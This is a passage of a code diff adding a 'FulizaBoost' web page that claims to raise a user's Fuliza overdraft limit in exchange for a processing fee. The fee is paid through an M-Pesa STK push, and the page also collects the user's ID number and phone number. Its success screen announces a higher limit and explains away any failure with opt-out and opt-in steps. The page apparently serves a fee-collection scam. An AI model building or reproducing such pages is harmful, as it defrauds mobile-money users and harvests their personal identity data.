+                <i class="fas fa-wallet"></i>
+              </div>
+              <div class="payment-details-box">
+                <div class="payment-detail-row">
+                  <span>New Limit:</span>
+                  <strong style="color: var(--primary);">Ksh ${selectedLoan.amount.toLocaleString()}</strong>
+                </div>
+                <div class="payment-detail-row">
+                  <span>Processing Fee:</span>
+                  <strong>Ksh ${selectedLoan.fee}</strong>
+                </div>
+                <div class="payment-detail-row">
+                  <span>ID Number:</span>
+                  <strong>${idNumber}</strong>
+                </div>
+                <div class="payment-detail-row">
+                  <span>Phone Number:</span>
+                  <strong>${formatPhoneForDisplay(phoneNumber)}</strong>
+                </div>
+              </div>
+              <p class="payment-phone-note">
+                An M-Pesa STK push will be sent to your phone to complete the payment
+              </p>
+            </div>
+          `,
+          icon: false,
+          showCancelButton: true,
+          confirmButtonText: 'Proceed with Payment',
+          cancelButtonText: 'Cancel',
+          confirmButtonColor: '#1f7a1f',
+          cancelButtonColor: '#6b7280',
+          customClass: {
+            popup: 'swal2-popup-mobile',
+            actions: 'swal2-actions-mobile'
+          }
+        });
+        
+        if (!confirmed.isConfirmed) {
+          resetButton();
+          return;
+        }
+        
+        // Show loading - MOBILE OPTIMIZED
+        Swal.fire({
+          title: 'Preparing Payment',
+          html: 'Please wait while we set up your payment...',
+          allowOutsideClick: false,
+          didOpen: () => Swal.showLoading(),
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        
+        // Normalize phone for STK
+        const normalizedPhone = await normalizePhoneNumber(phoneNumber);
+        
+        // Send STK push with ID number
+        Swal.update({
+          title: 'Sending M-Pesa STK Push',
+          html: 'Initiating payment request to your phone...'
+        });
+        
+        const paymentResponse = await sendPayHeroSTK(
+          normalizedPhone,
+          selectedLoan.fee,
+          selectedLoan.amount,
+          idNumber
+        );
+        
+        if (!paymentResponse || !paymentResponse.reference) {
+          throw new Error('Failed to initiate payment');
+        }
+        
+        paymentReference = paymentResponse.reference;
+        
+        // Show instruction modal - MOBILE OPTIMIZED
+        Swal.fire({
+          title: 'STK Push Sent!',
+          html: `
+            <div class="stk-push-content">
+              <div class="stk-push-icon">
+                <i class="fas fa-mobile-alt"></i>
+              </div>
+              <p><strong>Check your phone for the M-Pesa STK push</strong></p>
+              <div class="stk-phone-display">
+                ${formatPhoneForDisplay(phoneNumber)}
+              </div>
+              <p style="color: #666; margin-top: 5px;">
+                Enter your M-Pesa PIN to complete the payment
+              </p>
+              <div style="background: #f8f9f7; padding: 10px; border-radius: 8px; margin-top: 12px;">
+                <small>Verifying payment...</small>
+              </div>
+            </div>
+          `,
+          icon: false,
+          showConfirmButton: false,
+          allowOutsideClick: false,
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        
+        // Check payment status
+        const paymentSuccess = await checkPaymentStatus(paymentReference);
+        
+        if (paymentSuccess) {
+          // Success - MOBILE OPTIMIZED (Updated with styled note)
+          await Swal.fire({
+            title: 'Payment Successful!',
+            html: `
+              <div style="text-align: center; padding: 0 5px;">
+                <div class="success-icon">
+                  <i class="fas fa-check-circle"></i>
+                </div>
+                <p><strong>Your Fuliza limit has been increased!</strong></p>
+                <p style="color: #666; margin-top: 8px;">
+                  New limit: <strong style="color: #1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong>
+                </p>
+                
+                <!-- Enhanced note with better styling -->
+                <div style="
+                  background: linear-gradient(135deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
+                  border-left: 3px solid var(--accent);
+                  padding: 12px;
+                  border-radius: 8px;
+                  margin-top: 15px;
+                  text-align: left;
+                  font-size: 0.8rem;
+                  color: var(--text-dark);
+                  line-height: 1.4;
+                ">
+                  <div style="
+                    display: flex;
+                    align-items: flex-start;
+                    gap: 8px;
+                    margin-bottom: 4px;
+                  ">
+                    <i class="fas fa-exclamation-circle" style="color: var(--accent); font-size: 0.9rem;"></i>
+                    <strong style="color: var(--accent);">Important Note:</strong>
+                  </div>
+                  <div style="padding-left: 22px;">
+                    If your limit does not increase immediately, please:<br>
+                    1. Dial *234# on your phone<br>
+                    2. Select "Opt Out" from Fuliza<br>
+                    3. Wait 2 minutes, then dial *234# again<br>
+                    4. Select "Opt In" to activate your new limit
+                  </div>
+                </div>
+                
+                <p style="color: #666; margin-top: 10px; font-size: 0.8rem;">
+                  Thank you for using FulizaBoost!
+                </p>
+              </div>
+            `,
+            icon: false,
+            confirmButtonText: 'Continue',
+            confirmButtonColor: '#1f7a1f',
+            timer: 10000, // 10 seconds (increased from 4000ms)
+            timerProgressBar: true,
+            customClass: {
+              popup: 'swal2-popup-mobile'
+            }
+          });
+          
+          // Clear storage and reset
+          localStorage.removeItem('fulizaBoostData');
+          resetButton();
+          resetSelections();
+          
+        } else {
+          throw new Error('Payment not confirmed');
+        }
+        
+      } catch (error) {
+        console.error('Payment error:', error);
+        
+        Swal.fire({
+          title: 'Payment Failed',
+          html: `
+            <div style="text-align: center; padding: 0 5px;">
+              <div class="error-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+              </div>
+              <p><strong>${error.message || 'Payment processing failed'}</strong></p>
+              <p style="color: #666; margin-top: 10px; font-size: 0.85rem;">
+                Please check your phone network and M-Pesa balance, then try again
+              </p>
+            </div>
+          `,
+          icon: false,
+          confirmButtonText: 'Try Again',
+          confirmButtonColor: '#1f7a1f',
+          customClass: {
+            popup: 'swal2-popup-mobile'
+          }
+        });
+        
+        resetButton();
+      }
+    }
+
+    // Reset button state
+    function resetButton() {
+      isProcessing = false;
+      getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
+      getLimitBtn.disabled = false;
+      updateButtonState();
+    }
+
+    // Reset selections
+    function resetSelections() {
+      document.querySelectorAll('.loan-box').forEach(box => {
+        box.classList.remove('selected');
+      });
+      selectedLoan = null;
+      updateButtonState();
+    }
+
+    // Initialize page when DOM is loaded
+    document.addEventListener('DOMContentLoaded', initPage);
+
+    // Keyboard navigation for loan boxes
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
+        const selected = document.querySelector('.loan-box.selected');
+        if (selected) {
+          const next = selected.nextElementSibling || document.querySelector('.loan-box');
+          if (next) {
+            next.click();
+            next.focus();
+          }
+        }
+      } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
+        const selected = document.querySelector('.loan-box.selected');
+        if (selected) {
+          const prev = selected.previousElementSibling || 
+                      document.querySelectorAll('.loan-box')[document.querySelectorAll('.loan-box').length - 1];
+          if (prev) {
+            prev.click();
+            prev.focus();
+          }
+        }
+      }
+    });
+
+    // Prevent zoom on mobile
+    document.addEventListener('touchstart', function(e) {
+      if (e.touches.length > 1) {
+        e.preventDefault();
+      }
+    }, { passive: false });
+
+    let lastTouchEnd = 0;
+    document.addEventListener('touchend', function(e) {
+      const now = (new Date()).getTime();
+      if (now - lastTouchEnd <= 300) {
+        e.preventDefault();
+      }
+      lastTouchEnd = now;
+    }, false);
+
+  </script>
+
+</body>
+</html>
